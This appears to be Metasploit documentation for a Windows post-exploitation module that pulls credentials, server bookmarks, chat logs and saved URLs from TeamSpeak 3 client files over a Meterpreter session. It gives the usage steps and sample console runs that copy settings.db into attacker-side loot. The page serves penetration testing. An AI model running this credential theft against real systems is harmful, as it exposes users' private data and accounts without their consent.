## Vulnerable Application

This post-exploitation module extracts clear text credentials from the TeamSpeak 3 Client.

The TeamSpeak 3 Client is avaialble from (https://www.teamspeak3.com/teamspeak-download.php).

This module extracts information from the setting.db, urls.db and channel.txt files in the "AppData\Roaming\TS3Client" directory.

This module extracts server bookmarks, chat logs, last connected server and saved urls.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/teamspeak3_client
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### TeamSpeak 3 Client v3.6.1 on Windows 10 Home 10.0.19045 N/A Build 19045 Default
```
msf6 post(windows/gather/credentials/teamspeak3_client) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Teamspeak 3 client's Settings.db file found
[*] Downloading C:\Users\test\AppData\Roaming\TS3Client\settings.db
[*] Teamspeak 3 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510155124_default_10.0.0.2_teamspeak3clie_185144.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510155124_default_10.0.0.2_EXTRACTIONSsetti_578247.db
[*] Teamspeak 3 client's Settings.db file found
[*] Downloading C:\Users\test\AppData\Roaming\TS3Client\settings.db
[*] Teamspeak 3 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510155124_default_10.0.0.2_teamspeak3clie_894212.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510155125_default_10.0.0.2_EXTRACTIONSsetti_824068.db
[*] PackRat credential sweep Completed
[*] Post module execution completed
```

### TeamSpeak 3 Client v3.6.1 on Windows 10 Home 10.0.19045 N/A Build 19045 Verbose
```
msf6 post(windows/gather/credentials/teamspeak3_client) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Teamspeak 3 client's base folder not found in user's user directory

[-] Teamspeak 3 client's base folder not found in user's user directory

[-] Teamspeak 3 client's base folder not found in users's user directory

[-] Teamspeak 3 client's base folder not found in user's user directory

[*] Starting Packrat...
[*] Teamspeak 3 client's base folder found
[*] Found the folder containing specified artifact for urls.db.
[-] Teamspeak 3 client's Urls.db not found in Test's user directory

[-] Skipping urls.db since it was not found on the user's folder.
[*] Teamspeak 3 client's base folder found
[*] Found the folder containing specified artifact for settings.db.
[*] Teamspeak 3 client's Settings.db file found
[*] Processing C:\Users\test\AppData\Roaming\TS3Client
[*] Downloading C:\Users\test\AppData\Roaming\TS3Client\settings.db
[*] Teamspeak 3 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510155252_default_10.0.0.2_teamspeak3clie_706809.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510155252_default_10.0.0.2_EXTRACTIONSsetti_424766.db
[*] Teamspeak 3 client's base folder found
[*] Found the folder containing specified artifact for channel.txt.
[-] Teamspeak 3 client's Channel.txt not found in Test's user directory

[-] Skipping channel.txt since it was not found on the user's folder.
[*] Teamspeak 3 client's base folder found
[*] Found the folder containing specified artifact for settings.db.
[*] Teamspeak 3 client's Settings.db file found
[*] Processing C:\Users\test\AppData\Roaming\TS3Client
[*] Downloading C:\Users\test\AppData\Roaming\TS3Client\settings.db
[*] Teamspeak 3 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510155253_default_10.0.0.2_teamspeak3clie_241400.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510155253_default_10.0.0.2_EXTRACTIONSsetti_892091.db
[*] PackRat credential sweep Completed
[*] Post module execution completed
```
